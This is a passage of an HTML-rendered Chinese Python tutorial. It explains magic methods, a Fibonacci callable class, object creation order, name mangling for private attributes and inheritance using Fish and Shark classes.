class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre></pre></td></tr><tr><td data-num=\"143\"></td><td><pre></pre></td></tr><tr><td data-num=\"144\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">primarymain</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>        select <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1.检测密码\\n2.检测邮箱\\n3.退出\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>        <span class=\"token keyword\">if</span> select <span class=\"token operator\">==</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre>            checkpwd<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>        <span class=\"token keyword\">elif</span> select <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre>            checkemail<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>            exit<span class=\"token punctuation\">(</span><span class=\"token string\">'bye'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre></pre></td></tr><tr><td data-num=\"154\"></td><td><pre></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>primarymain<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>__repr__()</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    1、用print去打印 实例，调用顺序是：重写的__str__方法>重写的__repr__方法>未重写的__str__方法>未重写的__repr__方法</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    2、__str__实际上是调用了__repr__</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>__str__()</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    如果一个类中定义了__str__()方法，那么在打印&lt;对象>时，默认输出该方法的返回值。</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>__bool__()</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    返回真或假</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>__call__():</pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    如果为一个类编写了该方法，那么在该类的实例后面加括号，可会调用这个方法。</pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    注：构造方法的执行是由类加括号执行的，即：对象 = 类名()，而对于__call__() 方法，</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    是由对象后加括号触发的，即：对象() 或者 类()()</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>'''</span></pre></td></tr></table></figure><h3 id=\"斐波那契数列\"><a class=\"anchor\" href=\"#斐波那契数列\">#</a> 斐波那契数列</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Fibonacci</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__call__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        a<span class=\"token punctuation\">,</span> b <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        self<span class=\"token punctuation\">.</span>lst <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token keyword\">if</span> num <span class=\"token operator\">&lt;=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            self<span class=\"token punctuation\">.</span>lst<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            self<span class=\"token punctuation\">.</span>lst<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> num <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>                self<span class=\"token punctuation\">.</span>lst<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>                a<span class=\"token punctuation\">,</span> b <span class=\"token operator\">=</span> b<span class=\"token punctuation\">,</span> a <span class=\"token operator\">+</span> b</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">return</span> self<span class=\"token punctuation\">.</span>lst</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__str__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>lst<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>f <span class=\"token operator\">=</span> Fibonacci<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>ret <span class=\"token operator\">=</span> f<span class=\"token punctuation\">(</span><span class=\"token number\">12</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>ret<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"帮助自己理解\"><a class=\"anchor\" href=\"#帮助自己理解\">#</a> 帮助自己理解</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__new__</span><span class=\"token punctuation\">(</span>cls<span class=\"token punctuation\">,</span> <span class=\"token operator\">*</span>args<span class=\"token punctuation\">,</span> <span class=\"token operator\">**</span>kwargs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'->>>>>_new1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token builtin\">object</span><span class=\"token punctuation\">.</span>__new__<span class=\"token punctuation\">(</span>cls<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'->>>>_init_2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__del__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'->>>>_del_'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">B</span><span class=\"token punctuation\">(</span>A<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__call__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'dijia!!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__str__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"gaiya!!\"</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__repr__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token string\">\"daina!!\"</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>b <span class=\"token operator\">=</span> A<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'kongnijiwa'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>a <span class=\"token operator\">=</span> A<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>d <span class=\"token operator\">=</span> B<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>d<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token comment\">#### 输出结果</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">>></span><span class=\"token operator\">>></span><span class=\"token operator\">></span>_new1</pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">>></span><span class=\"token operator\">>></span>_init_2</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>kongnijiwa</pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">>></span><span class=\"token operator\">>></span><span class=\"token operator\">></span>_new1</pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">>></span><span class=\"token operator\">>></span>_init_2</pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">>></span><span class=\"token operator\">>></span><span class=\"token operator\">></span>_new1</pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">>></span><span class=\"token operator\">>></span>_init_2</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>dijia!!</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>gaiya!!</pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">>></span><span class=\"token operator\">>></span>_del_</pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">>></span><span class=\"token operator\">>></span>_del_</pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">>></span><span class=\"token operator\">>></span>_del_</pre></td></tr></table></figure><h2 id=\"公有与私有\"><a class=\"anchor\" href=\"#公有与私有\">#</a> 公有与私有</h2>\n<p>Python 中并没有像 C++、JAVA 那样使用关键字 public 和 private，用于声明数据是公有还是私有。为了实现私有变量的特征，Python 内部采用了一种叫 name mangling（名字改编）的技术，在 Python 中定义私有变量，只需要在变量名或函数名前加上 &quot;__&quot; 两个下划线，那么这个变量或函数就会变成私有的了。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    __name <span class=\"token operator\">=</span> <span class=\"token string\">\"dijia\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>a <span class=\"token operator\">=</span> A<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>__name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">#### 输出</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  File <span class=\"token string\">\"G:/Text_Files/1.py\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">199</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    a<span class=\"token punctuation\">.</span>__name</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>AttributeError<span class=\"token punctuation\">:</span> <span class=\"token string\">'A'</span> <span class=\"token builtin\">object</span> has no attribute <span class=\"token string\">'__name'</span></pre></td></tr></table></figure><p>但你认真琢磨一下这个技术的名字 name mangling (名字改编)，不难发现其实 Python 只是把两个下划线开头的变量进行了改名罢了。实际上在外部你使用 “_类名__变量名” 即可访问私有变量了：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">A</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    __name <span class=\"token operator\">=</span> <span class=\"token string\">\"dijia\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>a <span class=\"token operator\">=</span> A<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>_A__name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">####### 输出</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>dijia</pre></td></tr></table></figure><p>Python 目前的私有机制其实就是伪私有，Python 的类是没有控制权限的，所有变量都可以被外部调用的。</p>\n<h2 id=\"面向对象编程有三大重要特征封装-继承和多态\"><a class=\"anchor\" href=\"#面向对象编程有三大重要特征封装-继承和多态\">#</a> 面向对象编程有三大重要特征：封装、继承和多态</h2>\n<h3 id=\"封装\"><a class=\"anchor\" href=\"#封装\">#</a> 封装</h3>\n<p>封装是指将数据与具体操作的实现代码放在某个对象内部，使这些代码的实现细节不被外界发现，外界只能通过接口使用该对象，而不能通过任何形式修改对象内部实现，正是由于封装机制，程序在使用某一对象时不需要关心该对象的数据结构细节及实现操作的方法。使用封装能隐藏对象实现细节，使代码更易维护，同时因为不能直接调用、修改对象内部的私有信息，在一定程度上保证了系统安全性。类通过将函数和变量封装在内部，实现了比函数更高一级的封装。</p>\n<h3 id=\"继承\"><a class=\"anchor\" href=\"#继承\">#</a> 继承</h3>\n<p>继承来源于现实世界，一个最简单的例子就是孩子会具有父母的一些特征，即每个孩子都会继承父亲或者母亲的某些特征，当然这只是最基本的继承关系，现实世界中还存在着更复杂的继承。继承机制实现了代码的复用，多个类公用的代码部分可以只在一个类中提供，而其他类只需要继承这个类即可。</p>\n<p>在 OOP 程序设计中，当我们定义一个新类的时候，新的类称为子类（Subclass），而被继承的类称为基类、父类或超类（Base class、Super class）。继承最大的好处是子类获得了父类的全部变量和方法的同时，又可以根据需要进行修改、拓展。<br />\nPython 支持多父类的继承机制，所以需要注意圆括号中基类的顺序，若是基类中有相同的方法名，并且在子类使用时未指定，Python 会从左至右搜索基类中是否包含该方法。一旦查找到则直接调用，后面不再继续查找。</p>\n<p>需要注意的是，如果子类中定义域父类同名的方法或属性，则会自动覆盖父亲对应的方法或属性</p>\n<p>继承实例</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Fish</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        self<span class=\"token punctuation\">.</span>x <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">move</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        self<span class=\"token punctuation\">.</span>x <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"游动了一会，现在的位置是%d\"</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Salmon</span><span class=\"token punctuation\">(</span>Fish<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Goldfish</span><span class=\"token punctuation\">(</span>Fish<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">pass</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">### 上面都是普通鱼，下面定义一个吃货鱼，除了继承 Fish 类的属性和方法，再给它定义一个吃的方法</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Shark</span><span class=\"token punctuation\">(</span>Fish<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        self<span class=\"token punctuation\">.</span>hungry <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">eat</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">if</span> self<span class=\"token punctuation\">.</span>hungry <span class=\"token operator\">==</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"吃鱼咯\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            self<span class=\"token punctuation\">.</span>hungry <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"饱了不饿\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">############### 测试输出</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> fish <span class=\"token operator\">=</span> Fish<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> fish<span class=\"token punctuation\">.</span>move<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>游动了一会，现在的位置是<span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> fish<span class=\"token punctuation\">.</span>move<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>游动了一会，现在的位置是<span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> goldfish <span class=\"token operator\">=</span> Goldfish<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> goldfish<span class=\"token punctuation\">.</span>move<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>游动了一会，现在的位置是<span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark <span class=\"token operator\">=</span> Shark<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark<span class=\"token punctuation\">.</span>eat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>吃鱼咯</pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark<span class=\"token punctuation\">.</span>eat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>饱了不饿</pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark<span class=\"token punctuation\">.</span>eat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>饱了不饿</pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> </pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> shark<span class=\"token punctuation\">.</span>move<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>  File <span class=\"token string\">\"&lt;pyshell#26>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    shark<span class=\"token punctuation\">.</span>move<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>  File <span class=\"token string\">\"C:/Users/14268/Desktop/1.py\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> move</pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    self<span class=\"token punctuation\">.</span>x <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>AttributeError<span class=\"token punctuation\">:</span> <span class=\"token string\">'Shark'</span> <span class=\"token builtin\">object</span> has no attribute <span class=\"token string\">'x'</span></pre></td></tr></table></figure><p>同样是继承 Fish () 类，金鱼却可以移动，为什么鲨鱼不行呢？其实这里的报错说的已经很清楚了：Shark 类中没有 x 属性。<br />\n这是因为重写了魔法方法__init__, 但新的__init__方法里没有初始化鲨鱼的 x 坐标，因此调用 move 方法就会报错。<br />\n所以应该在鲨鱼类中重写__init__方法的时候先调用基类 Fish 的__init__方法。有两种实现方法：</p>\n<ul>\n<li>调用未绑定的父类方法</li>\n<li>使用 super 函数</li>\n</ul>\n<h4 id=\"调用未绑定的父类方法\"><a class=\"anchor\" href=\"#调用未绑定的父类方法\">#</a> 调用未绑定的父类方法</h4>\n<p>代码如下</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Shark</span><span class=\"token punctuation\">(</span>Fish<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        Fish<span class=\"token punctuation\">.</span>__init__<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        self<span class=\"token punctuation\">.</span>hungry <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td 